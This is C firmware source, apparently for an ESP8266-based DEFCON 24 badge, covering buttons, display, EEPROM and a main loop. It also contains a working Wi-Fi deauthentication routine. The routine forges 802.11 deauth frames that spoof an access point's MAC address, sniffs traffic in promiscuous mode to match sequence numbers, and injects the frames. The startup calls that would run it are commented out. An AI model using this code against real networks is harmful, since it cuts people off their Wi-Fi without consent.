#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_config.h"
#include "user_interface.h"
#include "driver/key.h"
#include "driver/uart.h"
#include "driver/i2c_master.h"
#include "ht16k33.h"
#include "debug.h"
#include "user_main.h"

system_flags_s system_flags;

#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];
static volatile os_timer_t deauth_timer;

// Channel to perform deauth
uint8_t channel = 1;

// Access point MAC to deauth
uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};

// Client MAC to deauth
uint8_t client[6] = {0x06,0x07,0x08,0x09,0x0A,0x0B};

// Sequence number of a packet from AP to client
uint16_t seq_n = 0;

// Packet buffer
uint8_t packet_buffer[64];

LOCAL struct keys_param keys;
LOCAL struct single_key_param *single_key[4];

int button_event;

/* ==============================================
 * Promiscous callback structures, see ESP manual
 * ============================================== */
 
struct RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};
 
struct LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

/* Creates a deauth packet.
 * 
 * buf - reference to the data array to write packet to;
 * client - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 * 
 * Returns: size of the packet
 */
uint16_t deauth_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;
    
    // Type: deauth
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;
    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // Deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}

/* Sends deauth packets. */
void deauth(void *arg)
{
    os_printf("\nSending deauth seq_n = %d ...\n", seq_n/0x10);
    // Sequence number is increased by 16, see 802.11
    uint16_t size = deauth_packet(packet_buffer, client, ap, seq_n+0x10);
    wifi_send_pkt_freedom(packet_buffer, size, 0);
}

/* Listens communication between AP and client */
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len == 128) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    } else {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        int i=0;
        // Check MACs
        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
        for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
        // Update sequence number
        seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
    }
}

void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(1);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

/*
 * Button Handler functions
 */

void ICACHE_FLASH_ATTR
button_up_long_press(void)
{
    debug_print("Up long press\r\n");
}

void ICACHE_FLASH_ATTR
button_up_short_press(void)
{
    debug_print("Up short press\r\n");
}

void ICACHE_FLASH_ATTR
button_down_long_press(void)
{
    debug_print("Down long press\r\n");
}

void ICACHE_FLASH_ATTR
button_down_short_press(void)
{
    debug_print("Down short press\r\n");
}

void ICACHE_FLASH_ATTR
button_left_long_press(void)
{
    debug_print("Left long press\r\n");
}

void ICACHE_FLASH_ATTR
button_left_short_press(void)
{
    debug_print("Left short press\r\n");
}

void ICACHE_FLASH_ATTR
button_right_long_press(void)
{
    debug_print("Right long press\r\n");
}

void ICACHE_FLASH_ATTR
button_right_short_press(void)
{
    debug_print("Right short press\r\n");
}

/* 
 * Initialization functions
 */

void ICACHE_FLASH_ATTR
buttons_init()
{
    debug_print("Enter buttons_init\r\n");
    single_key[0] = key_init_single(BUTTON_UP_IO_NUM, BUTTON_UP_IO_MUX, BUTTON_UP_IO_FUNC, button_up_long_press, button_up_short_press);
    single_key[1] = key_init_single(BUTTON_DOWN_IO_NUM, BUTTON_DOWN_IO_MUX, BUTTON_DOWN_IO_FUNC, button_down_long_press, button_down_short_press);
    single_key[2] = key_init_single(BUTTON_LEFT_IO_NUM, BUTTON_LEFT_IO_MUX, BUTTON_LEFT_IO_FUNC, button_left_long_press, button_left_short_press);
    single_key[3] = key_init_single(BUTTON_RIGHT_IO_NUM, BUTTON_RIGHT_IO_MUX, BUTTON_RIGHT_IO_FUNC, button_right_long_press, button_right_short_press);

    keys.key_num = 4;
    keys.single_key = single_key;
    key_init(&keys);
    debug_print("Leave buttons_init\r\n");
}

void ICACHE_FLASH_ATTR
i2c_init()
{
    debug_print("Enter i2c_init\r\n");
    i2c_master_gpio_init();
    i2c_master_init();
    debug_print("Leave i2c_init\r\n");
}

void loop(os_event_t *events)
{
    //Move the current display text into the output buffer and send it to the display
    display_update();
    send_display_buffer();

    os_delay_us(100000);
    system_os_post(user_procTaskPrio, 0, 0 );
}

void ICACHE_FLASH_ATTR
user_init()
{
    uart_init(115200, 115200);
    os_printf("\n\nSDK version:%s\n", system_get_sdk_version());
    os_printf("\n\nWelcome to DEFCON 24\n");
    os_printf("\n\nThis badge was a labor of love and coffee by Errant Librarian (hardware and firmware) and nodoze (assembly and bad ideas)\n");
    
    // Promiscuous works only with station mode
    //wifi_set_opmode(STATION_MODE);

    gpio_init();

    i2c_init();
    buttons_init();
    display_init();
    os_printf("Display setup done\r\n");

    eeprom_write_byte(0x0000, 0x33);
    os_printf("%x\r\n", eeprom_read_byte(0x0000));

    eeprom_read_settings();
    os_printf("EEPROM settings loaded\r\n");

    display_write(" ERRANT ");
    os_printf("Startup message sent to display\r\n");

    system_os_task(loop, user_procTaskPrio, user_procTaskQueue, user_procTaskQueueLen);
    system_os_post(user_procTaskPrio, 0, 0);

    // Set timer for deauth
    // os_timer_disarm(&deauth_timer);
    // os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
    // os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
    
    // Continue to 'sniffer_system_init_done'
    // system_init_done_cb(sniffer_system_init_done);
}